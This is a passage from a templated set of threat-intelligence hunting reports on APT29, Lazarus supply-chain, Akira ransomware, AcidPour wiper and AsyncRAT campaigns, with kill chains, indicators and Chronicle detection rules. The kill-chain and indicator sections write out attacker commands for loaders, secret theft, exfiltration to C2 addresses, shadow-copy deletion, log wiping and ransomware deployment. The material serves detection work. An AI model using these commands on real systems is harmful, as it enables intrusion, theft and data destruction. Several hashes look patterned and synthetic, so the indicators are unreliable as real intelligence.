| URL | `https://login-msft-sso-federation.org/oauth2/v2.0/authorize` | Rogue OAuth Consent Grant Phishing URI (HTTPS) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `az ad app credential reset --id 00000003-0000-0000-c000-000000000000 --append` | Appends new secret credential to existing Azure AD / Entra application |
| File Path | `/tmp/.msal_token_cache_apt29.json` | Cached OAuth refresh and access tokens on operator staging host |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: APT29 (Midnight Blizzard) OAuth Token & Entra ID Cross-Tenant Cloud Identity Intrusion
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("194.36.191.74", "91.199.84.112") or
  principal.ip in ("194.36.191.74", "91.199.84.112") or
  network.dns.questions.name in ("login-msft-sso-federation.org") or
  target.hostname in ("login-msft-sso-federation.org") or
  target.file.sha256 in ("1d77c8902a44e612b09384f712c90a8834b1209fe7612a409cb812390ef41a20") or
  principal.process.file.sha256 in ("1d77c8902a44e612b09384f712c90a8834b1209fe7612a409cb812390ef41a20") or
  target.file.md5 in ("e44190c82a117b9034f812c09a4412b8") or
  target.url in ("https://login-msft-sso-federation.org/oauth2/v2.0/authorize")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: GraphAPI-Backdoor
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(\.msal_token_cache_apt29\.json).*/ nocase or
  target.process.file.full_path = /.*(\.msal_token_cache_apt29\.json).*/ nocase or
  target.process.command_line = /.*credential.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`apt29_midnight_blizzard_oauth_token_entra_id_ti2026`)
```yara
rule apt29_midnight_blizzard_oauth_token_entra_id_ti2026 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with APT29 (Midnight Blizzard) OAuth Token & Entra ID Cross-Tenant Cloud Identity Intrusion"
    severity = "CRITICAL"
    priority = "HIGH"
    mitre_attack = "T1110.003, T1098.001, T1098.003, T1550.001, T1114.002"
    cve_references = "CVE-2025-49011"
    threat_actor = "APT29"
    malware_family = "GraphAPI-Backdoor"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("1d77c8902a44e612b09384f712c90a8834b1209fe7612a409cb812390ef41a20") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("194.36.191.74", "91.199.84.112") or
      $net.network.dns.questions.name in ("login-msft-sso-federation.org") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(95)
    $mitre_techniques = array_distinct("T1110.003, T1098.001, T1098.003, T1550.001, T1114.002")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: Lazarus Group & APT41 Polyglot Supply Chain Attack on PyPI / NPM CI/CD Pipelines

- **Report ID:** `ti-2026-005`
- **Severity:** **Critical** (CVSS 9.3)
- **Published:** 2026-11-03T13:33:57.412Z
- **Source:** [Unit 42](https://unit42.paloaltonetworks.com/)
- **Threat Actor / Cluster:** Lazarus (Supply Chain Attacks)
- **Malware Family:** InvisibleFerret (Loaders)
- **CVE References:** CVE-2026-0419
- **Target Industries:** Finance/BFSI, Technology/SaaS, Telecom
- **Target Regions:** APAC, North America, Europe, Global

---

## 1. Executive Summary

Lazarus Group (TraderTraitor) and overlapping APT41 supply chain clusters have published typosquatted and hijacked packages on NPM and PyPI targeting Finance/BFSI, cryptocurrency exchanges, and SaaS engineering teams in APAC, North America, and Europe. During `npm install` or `pip install` inside GitHub Actions or developer laptops, preinstall hooks execute obfuscated Node.js/Python payloads (BeaverTail) that harvest `.env` secrets, Kubernetes kubeconfigs, and SSH keys before deploying the InvisibleFerret modular backdoor.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: Malicious NPM / PyPI Package Preinstall Hook Execution (`T1195.001`)
Developers or CI/CD runners install a trojanized dependency containing a hidden postinstall script.
- **Observed Artifact / Command:** `node ./scripts/preinstall-telemetry.js --silent`

### 2. Execution: BeaverTail Loader & Embedded Python Portable Runtime (`T1059.006`)
Drops a standalone portable Python environment into ~/.npl/ to execute InvisibleFerret even on hosts without Python installed.
- **Observed Artifact / Command:** `~/.npl/python3/bin/python3 ~/.npl/main.py -s 1224`

### 3. Persistence: macOS LaunchAgent / Linux Cron / Windows Registry Persistence (`T1543.001`)
Writes a plist LaunchAgent on macOS or crontab entry on Linux build servers to maintain continuous C2 polling.
- **Observed Artifact / Command:** `~/Library/LaunchAgents/com.apple.node.helper.plist`

### 4. Privilege Escalation: CI/CD Runner OIDC Token & AWS IAM Role Assumption (`T1528`)
Extracts GitHub Actions ACTIONS_ID_TOKEN_REQUEST_URL to mint short-lived AWS/GCP production admin credentials.
- **Observed Artifact / Command:** `curl -H "Authorization: bearer $ACTIONS_RUNTIME_TOKEN" $ACTIONS_ID_TOKEN_REQUEST_URL`

### 5. Defense Evasion: XOR Base64 Multi-Layer String Obfuscation (`T1027`)
Payloads dynamically reconstruct C2 IP addresses and module imports using multi-round XOR and zlib decompression.
- **Observed Artifact / Command:** `exec(marshal.loads(zlib.decompress(base64.b64decode(buf))))`

### 6. Lateral Movement: SSH Key & Kubeconfig Production Cluster Pivot (`T1021.004`)
Uses harvested ~/.ssh/id_ed25519 and ~/.kube/config files to access production Kubernetes pods and vault secrets.
- **Observed Artifact / Command:** `kubectl get secrets --all-namespaces -o json`

### 7. Exfiltration & Impact: Source Code, Hot Wallet Keys & Environment Secret Exfiltration (`T1567`)
Streams `.env` files, Terraform state files, and private signing keys over HTTP POST to Lazarus C2 servers.
- **Observed Artifact / Command:** `POST http://147.124.214.131:1224/uploads`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1195.001` | Supply Chain Compromise: Compromise Software Dependencies | Injects BeaverTail loader into open-source NPM/PyPI packages. |
| **Execution** | `T1059.006` | Command and Scripting Interpreter: Python | Executes InvisibleFerret cross-platform Python backdoor. |
| **Credential Access** | `T1552.001` | Unsecured Credentials: Credentials In Files | Scans filesystem for .env, .npmrc, .aws/credentials, and .kube/config. |
| **Defense Evasion** | `T1027` | Obfuscated Files or Information | Uses marshal + zlib + base64 obfuscation in Python scripts. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `7b12c904fa8812e309d451c78a2310f98e1204bc7761a2390ef1284c9012a44b` | `preinstall-telemetry.js` |
| SHA-256 | `4e0912a88c34b7120f9812d34c56a0192b8412f90e3312a78c9012b45e11a802` | `invisible_ferret_main.py` |
| MD5 | `c1902a8471bf9023e1124c890a7712d4` | `beavertail_darwin.macho` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `147.124.214.131` | InvisibleFerret C2 Server (Port 1224) (TCP/1224) |
| IPv4 | `45.61.169.210` | BeaverTail Staging Node (TCP/443) |
| Domain | `registry-npm-mirror-telemetry.io` | Malicious Dependency Fallback Host (HTTPS) |
| URL | `http://147.124.214.131:1224/client/99` | Second-Stage Python Module Download URI (HTTP) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `python3 -c "import urllib.request,marshal,zlib,base64;exec(marshal.loads(...))"` | In-memory Python stage-2 loader execution |
| File Path | `/Users/shared/.npl/main.py` | Hidden InvisibleFerret directory created in user home or shared path |
| File Path | `C:\Users\Public\.npl\python3\python.exe` | Bundled portable Python interpreter on Windows hosts |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: Lazarus Group & APT41 Polyglot Supply Chain Attack on PyPI / NPM CI/CD Pipelines
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("147.124.214.131", "45.61.169.210") or
  principal.ip in ("147.124.214.131", "45.61.169.210") or
  network.dns.questions.name in ("registry-npm-mirror-telemetry.io") or
  target.hostname in ("registry-npm-mirror-telemetry.io") or
  target.file.sha256 in ("7b12c904fa8812e309d451c78a2310f98e1204bc7761a2390ef1284c9012a44b", "4e0912a88c34b7120f9812d34c56a0192b8412f90e3312a78c9012b45e11a802") or
  principal.process.file.sha256 in ("7b12c904fa8812e309d451c78a2310f98e1204bc7761a2390ef1284c9012a44b", "4e0912a88c34b7120f9812d34c56a0192b8412f90e3312a78c9012b45e11a802") or
  target.file.md5 in ("c1902a8471bf9023e1124c890a7712d4") or
  target.url in ("http://147.124.214.131:1224/client/99")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: InvisibleFerret
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(main\.py|python\.exe).*/ nocase or
  target.process.file.full_path = /.*(main\.py|python\.exe).*/ nocase or
  target.process.command_line = /.*python3.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`lazarus_group_apt41_polyglot_supply_chain_at_ti2026`)
```yara
rule lazarus_group_apt41_polyglot_supply_chain_at_ti2026 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with Lazarus Group & APT41 Polyglot Supply Chain Attack on PyPI / NPM CI/CD Pipelines"
    severity = "CRITICAL"
    priority = "HIGH"
    mitre_attack = "T1195.001, T1059.006, T1552.001, T1027"
    cve_references = "CVE-2026-0419"
    threat_actor = "Lazarus"
    malware_family = "InvisibleFerret"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("7b12c904fa8812e309d451c78a2310f98e1204bc7761a2390ef1284c9012a44b", "4e0912a88c34b7120f9812d34c56a0192b8412f90e3312a78c9012b45e11a802") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("147.124.214.131", "45.61.169.210") or
      $net.network.dns.questions.name in ("registry-npm-mirror-telemetry.io") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(95)
    $mitre_techniques = array_distinct("T1195.001, T1059.006, T1552.001, T1027")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: Akira & BlackCat Linux/Windows Ransomware Campaign Targeting Manufacturing & Retail OT Gateways

- **Report ID:** `ti-2026-006`
- **Severity:** **High** (CVSS 8.8)
- **Published:** 2026-10-30T17:33:57.412Z
- **Source:** [CrowdStrike Adversary Intel](https://www.crowdstrike.com/en-us/blog/)
- **Threat Actor / Cluster:** Akira Syndicate (Zero-Day Exploits)
- **Malware Family:** Akira (Ransomware)
- **CVE References:** CVE-2024-20353, CVE-2025-11904
- **Target Industries:** Manufacturing, Retail, Critical Infrastructure/Energy
- **Target Regions:** Europe, North America, LATAM

---

## 1. Executive Summary

CrowdStrike Adversary Intelligence and Dark Reading report active intrusions by Akira and BlackCat (ALPHV) splinter affiliates targeting Manufacturing, Automotive, and Retail supply chains across Europe, North America, and LATAM. Attackers exploit legacy SSL VPN portals without FIDO2 phishing-resistant MFA, deploy Chisel/Cloudflared reverse tunnels, extract Active Directory kerberoastable service tickets, and execute high-speed multi-threaded encryption across both Windows file servers and Linux ERP hosts.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: Cisco ASA / Firepower VPN Exploitation & Credential Stuffing (`T1133`)
Exploits CVE-2024-20353 / CVE-2025-11904 and replays leaked contractor VPN credentials.
- **Observed Artifact / Command:** `POST /+CSCOE+/saml/sp/acs?tgname=a`

### 2. Execution: PowerShell Kerberoasting & SharpHound BloodHound Collection (`T1059.001`)
Runs SharpHound in memory to identify shortest paths to Domain Admins and ERP database administrators.
- **Observed Artifact / Command:** `SharpHound.exe -c All --zipfilename corp_ad_graph.zip`

### 3. Persistence: Cloudflared & Chisel Reverse SOCKS Tunnel Service (`T1572`)
Installs cloudflared.exe as a Windows service to maintain persistent outbound QUIC/HTTP2 tunnel access.
- **Observed Artifact / Command:** `cloudflared.exe service install eyJhIjoiOTAxMmFi...`

### 4. Privilege Escalation: Active Directory Certificate Services (ADCS) ESC1 Exploitation (`T1649`)
Requests a domain administrator smartcard certificate using Certify.exe via a misconfigured ADCS template.
- **Observed Artifact / Command:** `Certify.exe request /ca:dc01.corp.local\corp-CA /template:SubCA /altname:Administrator`

### 5. Defense Evasion: Windows Defender GPO Tampering & Safe Mode Boot Manipulation (`T1562.009`)
Modifies Group Policy and bcdedit to reboot targeted servers into Safe Mode with Networking to bypass AV.
- **Observed Artifact / Command:** `bcdedit /set {default} safeboot network`

### 6. Lateral Movement: PsExec & WinRM Mass Deployment Across Subnets (`T1570`)
Distributes the Akira encryptor binary (akira_w64.exe) across all domain-joined hosts via PsExec.
- **Observed Artifact / Command:** `psexec.exe @hosts.txt -u CORP\Admin -d -c C:\Windows\Temp\akira_w64.exe -p=\\10.1.0.0`

### 7. Exfiltration & Impact: WinSCP SFTP Exfiltration & ChaCha20-RSA File Encryption (`T1486`)
Exfiltrates ERP blueprints via WinSCP CLI before appending .akira / .alphv extensions to enterprise data.
- **Observed Artifact / Command:** `akira_w64.exe --encryption_path="D:\SAP_ERP_DATA" --share_file="shares.txt"`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1133` | External Remote Services | Gains entry via exposed SSL VPN gateways. |
| **Command and Control** | `T1572` | Protocol Tunneling | Uses Cloudflared and Chisel for outbound C2 tunneling. |
| **Credential Access** | `T1649` | Steal or Forge Authentication Certificates | Exploits ADCS ESC1 template misconfigurations. |
| **Defense Evasion** | `T1562.009` | Impair Defenses: Safe Mode Boot | Reboots endpoints into Safe Mode prior to encryption. |
| **Impact** | `T1486` | Data Encrypted for Impact | Executes ChaCha20 + RSA-4096 hybrid encryption. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `6c44a109e821b7304d9120f8a4c551290e8412a309bc7712e4509a12d84f9011` | `akira_w64.exe` |
| SHA-1 | `8b1209f44a712c90e3412b88a0912d45f7123a01` | `SharpHound.exe` |
| MD5 | `3e9012a44b812c709d1124f89a0123e5` | `chisel_win64.exe` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `185.172.128.95` | Akira SFTP Exfiltration Server (TCP/22) |
| Domain | `akira-leak-negotiation-portal.onion.ly` | Tor2Web Extortion Portal Gateway (HTTPS) |
| URL | `https://akira-leak-negotiation-portal.onion.ly/chat/id-99412` | Victim Extortion Negotiation URL (HTTPS) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `powershell.exe -Command "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"` | PowerShell WMI shadow copy deletion characteristic of Akira |
| Command Line | `bcdedit /set {default} safeboot network` | Forces Safe Mode boot to bypass security agents |
| File Path | `C:\ProgramData\akira_readme.txt` | Ransom note dropped across encrypted directories |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: Akira & BlackCat Linux/Windows Ransomware Campaign Targeting Manufacturing & Retail OT Gateways
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("185.172.128.95") or
  principal.ip in ("185.172.128.95") or
  network.dns.questions.name in ("akira-leak-negotiation-portal.onion.ly") or
  target.hostname in ("akira-leak-negotiation-portal.onion.ly") or
  target.file.sha256 in ("6c44a109e821b7304d9120f8a4c551290e8412a309bc7712e4509a12d84f9011") or
  principal.process.file.sha256 in ("6c44a109e821b7304d9120f8a4c551290e8412a309bc7712e4509a12d84f9011") or
  target.file.md5 in ("3e9012a44b812c709d1124f89a0123e5") or
  target.url in ("https://akira-leak-negotiation-portal.onion.ly/chat/id-99412")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: Akira
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(akira_readme\.txt).*/ nocase or
  target.process.file.full_path = /.*(akira_readme\.txt).*/ nocase or
  target.process.command_line = /.*-Command.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`akira_blackcat_linux_windows_ransomware_camp_ti2026`)
```yara
rule akira_blackcat_linux_windows_ransomware_camp_ti2026 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with Akira & BlackCat Linux/Windows Ransomware Campaign Targeting Manufacturing & Retail OT Gateways"
    severity = "HIGH"
    priority = "MEDIUM"
    mitre_attack = "T1133, T1572, T1649, T1562.009, T1486"
    cve_references = "CVE-2024-20353, CVE-2025-11904"
    threat_actor = "Akira Syndicate"
    malware_family = "Akira"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("6c44a109e821b7304d9120f8a4c551290e8412a309bc7712e4509a12d84f9011") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("185.172.128.95") or
      $net.network.dns.questions.name in ("akira-leak-negotiation-portal.onion.ly") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(80)
    $mitre_techniques = array_distinct("T1133, T1572, T1649, T1562.009, T1486")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: AcidPour & Industroyer-Variant OT Wiper Campaign Against Energy & Telecom Substations

- **Report ID:** `ti-2025-007`
- **Severity:** **Critical** (CVSS 9.7)
- **Published:** 2025-11-18T14:20:00.000Z
- **Source:** [Dark Reading](https://www.darkreading.com/)
- **Threat Actor / Cluster:** Sandworm / APT44 (APT Groups)
- **Malware Family:** AcidPour Wiper (Wipers)
- **CVE References:** CVE-2025-0918
- **Target Industries:** Critical Infrastructure/Energy, Telecom, Government
- **Target Regions:** Europe, Middle East

---

## 1. Executive Summary

Analysis by Mandiant and CISA details a destructive wiper operation utilizing AcidPour—an evolved variant of AcidRain—paired with ICS protocol disruption modules targeting Critical Infrastructure/Energy and Telecom operators in Europe and Middle East. The binary recursively enumerates `/dev/mtd*`, `/dev/mmcblk*`, and `/dev/sd*` flash and block devices on embedded Linux routers and substation RTUs, issuing `MEMERASE` and `BLKSECDISP` ioctl syscalls before forcing an irreversible hardware reboot.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: Compromised OT Vendor VPN & Exposed MikroTik/Edge Management Interfaces (`T1133`)
Gains access to OT demilitarized zone (DMZ) via stolen third-party maintenance credentials.
- **Observed Artifact / Command:** `ssh admin@10.110.4.1 -i id_rsa_vendor`

### 2. Execution: ELF32/ARM & x86_64 Wiper Binary Execution from /tmp (`T1059.004`)
Copies compiled AcidPour ELF binary to /tmp/ummc and executes with root privileges.
- **Observed Artifact / Command:** `chmod +x /tmp/ummc && /tmp/ummc -d`

### 3. Persistence: Cron & Init.d Startup Script Injection Prior to Trigger Window (`T1053.003`)
Stages wiper execution via /etc/init.d/rc.local for synchronized multi-host detonation.
- **Observed Artifact / Command:** `echo "/tmp/ummc &" >> /etc/rc.local`

### 4. Privilege Escalation: Linux Kernel Netfilter Local Privilege Escalation (CVE-2025-0918) (`T1068`)
Escalates from low-privilege web daemon user to root via netfilter nf_tables out-of-bounds write.
- **Observed Artifact / Command:** `/tmp/nft_priv_esc`

### 5. Defense Evasion: Self-Deletion & Syslog Daemon Termination (`T1070.002`)
Unlinks its own binary from disk immediately after initialization and stops rsyslogd.
- **Observed Artifact / Command:** `systemctl stop rsyslog && rm -f /var/log/auth.log`

### 6. Lateral Movement: Automated SSH & SNMPv3 Substation Switch Propagation (`T1021.004`)
Uses embedded SSH keyrings and SNMP write community strings to push the wiper across adjacent RTUs.
- **Observed Artifact / Command:** `scp /tmp/ummc root@10.110.4.22:/tmp/ummc`

### 7. Exfiltration & Impact: SPI NOR/NAND Flash IOCTL Erase & Block Device Overwrite (`T1561.002`)
Issues MEMERASE, MEMUNLOCK, and BLKSECDISP ioctls across /dev/mtd* and /dev/mmcblk* devices, bricking firmware.
- **Observed Artifact / Command:** `ioctl(fd, MEMERASE, &erase_info) -> reboot(RB_AUTOBOOT)`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Privilege Escalation** | `T1068` | Exploitation for Privilege Escalation | Exploits Linux kernel nf_tables vulnerability CVE-2025-0918. |
| **Defense Evasion** | `T1070.002` | Indicator Removal: Clear Linux or Mac System Logs | Terminates rsyslog and removes /var/log/auth.log. |
| **Impact** | `T1561.002` | Disk Wipe: Disk Structure Wipe | Wipes raw MTD flash memory and eMMC/SD block storage. |
| **Impact** | `T1495` | Firmware Corruption | Erases bootloader partitions on industrial routers and RTUs. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `2f9018c44a12b7830e9124d6c8012a45f9123b88c4012e77a9012b34d812f09a` | `ummc_armel.elf` |
| SHA-1 | `5d1209a84c11b7823e0914f6a8821c09e4123b11` | `nft_priv_esc.elf` |
| MD5 | `9c112e4481bc72910d4451ef9012ab77` | `acidpour_x64.elf` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `185.244.212.61` | Sandworm Operational Staging Relay (TCP/443) |
| Domain | `update-mikrotik-routeros-mirror.net` | Spoofed Firmware Distribution Host (HTTPS) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `chmod +x /tmp/ummc && /tmp/ummc -d` | Execution of AcidPour wiper from /tmp |
| File Path | `/tmp/ummc` | Staged ELF wiper binary on embedded Linux gateway |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: AcidPour & Industroyer-Variant OT Wiper Campaign Against Energy & Telecom Substations
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("185.244.212.61") or
  principal.ip in ("185.244.212.61") or
  network.dns.questions.name in ("update-mikrotik-routeros-mirror.net") or
  target.hostname in ("update-mikrotik-routeros-mirror.net") or
  target.file.sha256 in ("2f9018c44a12b7830e9124d6c8012a45f9123b88c4012e77a9012b34d812f09a") or
  principal.process.file.sha256 in ("2f9018c44a12b7830e9124d6c8012a45f9123b88c4012e77a9012b34d812f09a") or
  target.file.md5 in ("9c112e4481bc72910d4451ef9012ab77")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: AcidPour Wiper
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  principal.process.file.full_path = /.*(ummc).*/ nocase or
  target.process.file.full_path = /.*(ummc).*/ nocase or
  target.process.command_line = /.*chmod.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`acidpour_industroyer_variant_ot_wiper_campai_ti2025`)
```yara
rule acidpour_industroyer_variant_ot_wiper_campai_ti2025 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with AcidPour & Industroyer-Variant OT Wiper Campaign Against Energy & Telecom Substations"
    severity = "CRITICAL"
    priority = "HIGH"
    mitre_attack = "T1068, T1070.002, T1561.002, T1495"
    cve_references = "CVE-2025-0918"
    threat_actor = "Sandworm / APT44"
    malware_family = "AcidPour Wiper"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("2f9018c44a12b7830e9124d6c8012a45f9123b88c4012e77a9012b34d812f09a") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("185.244.212.61") or
      $net.network.dns.questions.name in ("update-mikrotik-routeros-mirror.net") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(95)
    $mitre_techniques = array_distinct("T1068, T1070.002, T1561.002, T1495")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```


---

# Threat Intelligence & SecOps Hunting Report: AsyncRAT & Vidar Loader Campaign Abusing Signed Cloud Tunnel Binaries in Healthcare & Retail

- **Report ID:** `ti-2024-008`
- **Severity:** **Medium** (CVSS 7.4)
- **Published:** 2024-09-22T09:15:00.000Z
- **Source:** [KrebsOnSecurity](https://krebsonsecurity.com/)
- **Threat Actor / Cluster:** TA577 / AsyncRAT Operators (Phishing/BEC)
- **Malware Family:** AsyncRAT (RATs)
- **CVE References:** CVE-2024-38021
- **Target Industries:** Healthcare, Retail, Finance/BFSI
- **Target Regions:** North America, LATAM, APAC

---

## 1. Executive Summary

KrebsOnSecurity and Unit 42 documented a persistent multi-stage campaign utilizing HTML/SVG smuggling in tax and medical billing lures targeting Healthcare and Retail organizations in North America, LATAM, and APAC. Opening the embedded SVG reconstructs an ISO archive on disk containing a signed binary that side-loads Vidar Stealer and AsyncRAT, providing operators with keystroke logging, remote desktop control, and financial credential theft.

---

## 2. Execution Flow & Attack Kill Chain

### 1. Initial Access: HTML/SVG Smuggling Invoice Attachment (`T1027.006`)
Delivers an email attachment with an embedded JavaScript Blob that assembles a malicious ISO image locally inside the browser.
- **Observed Artifact / Command:** `Invoice_Remittance_Q3.svg -> Remittance_2024.iso`

### 2. Execution: WScript / CScript JScript Loader Execution (`T1059.007`)
Double-clicking the mounted ISO executes a hidden .js script via wscript.exe.
- **Observed Artifact / Command:** `wscript.exe //B //E:JScript "E:\verify_invoice.js"`

### 3. Persistence: HKCU Run Key & Scheduled Task Registration (`T1547.001`)
Adds a Registry Run value launching AsyncRAT via powershell.exe on user login.
- **Observed Artifact / Command:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\HealthPortalSync`

### 4. Privilege Escalation: Fodhelper.exe Registry Hijack UAC Bypass (`T1548.002`)
Populates HKCU\Software\Classes\ms-settings\Shell\Open\command to bypass UAC.
- **Observed Artifact / Command:** `fodhelper.exe`

### 5. Defense Evasion: AMSI Memory Patching & Process Injection into aspnet_compiler.exe (`T1562.001`)
Patches AmsiScanBuffer in memory and injects the .NET AsyncRAT assembly into aspnet_compiler.exe.
- **Observed Artifact / Command:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe`

### 6. Lateral Movement: RDP Credential Harvesting & SMB Share Enumeration (`T1021.001`)
Extracts saved RDP credentials from Windows Credential Manager to pivot to POS management servers.
- **Observed Artifact / Command:** `cmdkey /list`

### 7. Exfiltration & Impact: AsyncRAT TLS Socket C2 & Keylogger Exfiltration (`T1041`)
Streams keystrokes, clipboard contents, and financial portal screenshots over TLS to port 6606.
